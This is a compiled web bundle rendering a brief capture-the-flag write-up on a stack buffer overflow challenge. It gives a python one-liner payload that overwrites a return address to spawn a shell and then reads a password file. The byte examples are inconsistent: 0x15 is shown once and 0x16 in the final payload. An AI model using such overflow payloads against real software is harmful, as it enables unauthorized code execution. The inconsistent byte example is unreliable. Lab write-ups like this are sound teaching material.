(window.webpackJsonp=window.webpackJsonp||[]).push([[98],{439:function(t,e,a){"use strict";a.r(e);var s=a(13),n=Object(s.a)({},(function(){var t=this,e=t._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"stack-buffer-overflow-basic-2-write-up"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#stack-buffer-overflow-basic-2-write-up"}},[t._v("#")]),t._v(" Stack buffer overflow basic 2 Write up")]),t._v(" "),e("p",[t._v("We see that this is an example where we will want to use the buffer to overflow the return address of the stack too the address of our "),e("code",[t._v("shell()")]),t._v(" function.")]),t._v(" "),e("p",[t._v("We first need to get the exact number of bytes for our buffer, then append our payload onto it after that.")]),t._v(" "),e("p",[t._v("We also know that the computer is little endian, so we will need to enter our return address backwards.")]),t._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("python "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'print(\"a\"*128 + OUR_ADDRESS_HERE)'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" -"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./ch15\n\n")])])]),e("p",[t._v("Using "),e("code",[t._v("objdump -d ch15")]),t._v(", we see that the address of the "),e("code",[t._v("shell")]),t._v(" function is at "),e("code",[t._v("0x08048516")]),t._v(". Using this information, we can now design our payload:")]),t._v(" "),e("p",[t._v("\\x08\\x04\\x85\\x15 -> big endian")]),t._v(" "),e("p",[t._v("turns into")]),t._v(" "),e("p",[t._v("\\x15\\x85\\x04\\x08 -> little endian")]),t._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("python "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'print("a"*128 + "\\x16\\x85\\x04\\x08")\'')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" -"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./ch15\n\n")])])]),e("p",[t._v("and we get the password after using our new shell and doing "),e("code",[t._v("cat .passwd")])])])}),[],!1,null,null,null);e.default=n.exports}}]);